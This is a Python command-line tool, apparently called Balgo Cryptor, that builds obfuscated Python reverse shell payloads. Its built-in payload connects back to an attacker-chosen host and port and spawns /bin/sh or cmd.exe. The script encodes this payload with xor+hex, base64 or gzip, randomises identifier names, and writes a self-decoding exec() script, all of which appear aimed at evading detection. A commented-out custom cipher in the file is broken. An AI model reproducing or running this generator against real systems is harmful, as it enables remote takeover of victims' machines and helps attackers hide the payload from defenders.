#!/usr/bin/env python3
import argparse
import binascii
import base64
import random
import gzip
import re

from termcolor import colored

banner = '''
╭━━╮╱╱╱╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╱╱╱╱╱╱╭╮
┃╭╮┃╱╱╱┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╱╱╱╱╱╱╭╯╰╮
┃╰╯╰┳━━┫┃╭━━┳━━╮┃┃╱╰╋━┳╮╱╭┳━┻╮╭╋━━┳━╮
┃╭━╮┃╭╮┃┃┃╭╮┃╭╮┃┃┃╱╭┫╭┫┃╱┃┃╭╮┃┃┃┃━┫╭╯
┃╰━╯┃╭╮┃╰┫╰╯┃╰╯┃┃╰━╯┃┃┃╰━╯┃╰╯┃╰┫┃━┫┃
╰━━━┻╯╰┻━┻━╮┣━━╯╰━━━┻╯╰━╮╭┫╭━┻━┻━━┻╯
╱╱╱╱╱╱╱╱╱╭━╯┃╱╱╱╱╱╱╱╱╱╭━╯┃┃┃
╱╱╱╱╱╱╱╱╱╰━━╯╱╱╱╱╱╱╱╱╱╰━━╯╰╯
    
    '''
def print_banner(banner):
    rainbow_colors = ["red", "magenta", "blue", "cyan", "green", "yellow", "white"]
    char_r = list(banner)
    for i in range(len(char_r)):
        if char_r[i] != "\n":
            char_r[i] = colored(char_r[i], random.choice(rainbow_colors))
    banner_colored = "".join(char_r)
    print(banner_colored)
    
    
    
'''def funny(plaintext: str, key: str) -> str:
    # Initialisez le texte chiffré à vide
    ciphertext = ''

    # Loop over the characters in the plaintext
    for plain_char in plaintext:
        # Add the current character of the plaintext to the ciphertext by adding the corresponding key character
        ciphertext += chr(ord(plain_char) + ord(bin(key)[2:][len(ciphertext) % len(bin(key)[2:])]))

        # Add the key at the end of the ciphertext
        ciphertext += bin(key)

    # Return the ciphertext
    return ciphertext'''
    
def format_inline(payload):
    payload_lines = payload.split('\n')
    formatted_payload = '; '.join([line.strip() for line in payload_lines if line.strip()])
    return formatted_payload

def randomize_name(name):
    name_length = len(name)
    random_name = ""

    random_length = random.randint(10, 30) 

    for i in range(random_length):
        random_name += chr(random.randint(97,122))
    return random_name

def randomize_names(payload):
    names_map = {}

    function_name_pattern = re.compile("def (.*)\(")
    variable_name_pattern = re.compile("([a-zA-Z_][a-zA-Z0-9_]*) *= *")

    function_names = re.findall(function_name_pattern, payload)
    variable_names = re.findall(variable_name_pattern, payload)

    for function_name in function_names:
        random_name = randomize_name(function_name)
        names_map[function_name] = random_name
    for variable_name in variable_names:
        random_name = randomize_name(variable_name)
        names_map[variable_name] = random_name

    for old_name, new_name in names_map.items():
        payload = payload.replace(old_name, new_name)

    return payload




def reverse_shell_gen(host, port, infile, outfile, module):
    reverse_shell_payload = ""

    if infile:
        with open(infile) as f:
            reverse_shell_command = f.read()
            modules = re.findall("import (.*)", reverse_shell_command)
            from_imports = re.findall("from (.*) import (.*)", reverse_shell_command)
            modules = set(modules + [i[1] for i in from_imports])
    else:
        reverse_shell_command = "import socket,subprocess,os;\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\ns.connect(('{}',{}));\nos.dup2(s.fileno(),0);\nos.dup2(s.fileno(),1);\nos.dup2(s.fileno(),2);\np=subprocess.call(['/bin/sh','-i']) if os.name=='posix' else subprocess.call(['cmd.exe'])".format(host,port)
        modules = set(["socket", "subprocess", "os"])
        from_imports = []

    if module == "xor":
        text = "[+] Here Is Your Encoded Reverse Shell Payload String With Xor + Hex: \n"
        encoded = reverse_shell_command.encode("utf-8").hex()
        for char in encoded:
            encoded_char = ord(char) ^ 0xFF
            reverse_shell_payload += chr(encoded_char)
        payload_script = "import binascii, %s\nencoded = '" % ', '.join([module for module in modules if module not in [i[1] for i in from_imports]] + ["\nfrom %s import %s" % (i[0], i[1]) for i in from_imports]) + reverse_shell_payload +  "'\n\ndef decode_reverse_shell(encoded):\n    decoded = ''\n    for char in encoded:\n        decoded += chr(ord(char) ^ 0xFF)\n    return binascii.unhexlify(decoded).decode('utf-8') \n\nreverse_shell_command = decode_reverse_shell(encoded) \nexec(reverse_shell_command)"
        payload_script = randomize_names(payload_script)
        decoded_reverse_shell = binascii.unhexlify(encoded).decode('utf-8')
        

    if module == "base64":
        text = "[+] Here Is Your Encoded Reverse Shell Payload String With Base64: \n"
        reverse_shell_payload = base64.b64encode(reverse_shell_command.encode('utf-8')).decode('utf-8')
        payload_script = "import binascii, %s\nexec(binascii.a2b_base64(\"%s\".encode('utf8')).decode('utf8'))" % (', '.join([module for module in modules if module not in [i[1] for i in from_imports]] + ["from %s import %s" % (i[0], i[1]) for i in from_imports]), reverse_shell_payload)
        payload_script = randomize_names(payload_script)
        payload_script = format_inline(payload_script)
        decoded_reverse_shell = binascii.a2b_base64(reverse_shell_payload.encode('utf8')).decode('utf8')

    if module == "gzip":
        text = "[+] Here Is Your Encoded Reverse Shell Payload String With Gzip + Hex: \n"
        reverse_shell_payload = gzip.compress(reverse_shell_command.encode('utf-8'))
        reverse_shell_payload = binascii.b2a_hex(reverse_shell_payload).decode('utf-8')
        payload_script = "import gzip, binascii, %s\nexec(gzip.decompress(binascii.a2b_hex(\'%s\')).decode('utf-8'))" % (', '.join([module for module in modules if module not in [i[1] for i in from_imports]] + ["from %s import %s" % (i[0], i[1]) for i in from_imports]), reverse_shell_payload)
        payload_script = randomize_names(payload_script)
        payload_script = format_inline(payload_script)
        decoded_reverse_shell = gzip.decompress(binascii.a2b_hex(reverse_shell_payload)).decode('utf-8')

    '''if module == "funny":
        key = random.getrandbits(256)
        text = "[+] Here Is Your Encoded Reverse Shell Payload String With Funny: \n"
        # Encoding The Reverse Shell Command
        encoded = funny(reverse_shell_command, key)
        # Generating Payload Script
        payload_script = "import binascii\n%s\nencoded = '%s'\nkey = '%s'\n\ndef decrypt(ciphertext, key):\n    plaintext = ''\n    for cipher_char in ciphertext:\n        plaintext += chr(ord(cipher_char) - ord(key[len(plaintext) % len(key)]))\n    return plaintext\n\nreverse_shell_command = decrypt(encoded, key)\nexec(reverse_shell_command)" % ("\n".join(["import %s" % module for module in modules if module not in [i[1] for i in from_imports]] + ["from %s import %s" % (i[0], i[1]) for i in from_imports]), encoded, format(key, 'b'))
        payload_script = randomize_names(payload_script)
        payload_script = format_inline(payload_script)
        decoded_reverse_shell = funny(encoded, key)'''
    
    with open(outfile,'w') as f:
        print(colored(text, "white", attrs=["bold"]))
        if len(reverse_shell_payload) > 1000:
            print(colored(reverse_shell_payload[:1000] + ' ... (full payload length: %d chars)\n' % len(reverse_shell_payload), "green"))
        else:
            print(colored(reverse_shell_payload + '\n', "green"))
        f.write(payload_script + '\n')
        

        print(colored("\n[+] Here Is Your Decoded Reverse Shell Command: \n", "white", attrs=["bold"]))
        print(colored(decoded_reverse_shell, 'green'))

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Generates a reverse shell payload in Xor Encoding.')
    parser.add_argument('-lh', type=str, help='Specifies the host for the reverse shell.')
    parser.add_argument('-lp', type=int, help='Specifies the port for the reverse shell.')
    parser.add_argument('-i', type=str, help='Specifies the input file for the payload.')
    parser.add_argument('-o', type=str, required=True, help='Specifies the output file for the payload.')
    parser.add_argument('-m', type=str, choices=['xor','base64','gzip'], default='xor', help='Specifies the encoding module to use for the payload.')
    args = parser.parse_args()
    print_banner(banner)
    reverse_shell_gen(args.lh, args.lp, args.i, args.o, args.m)
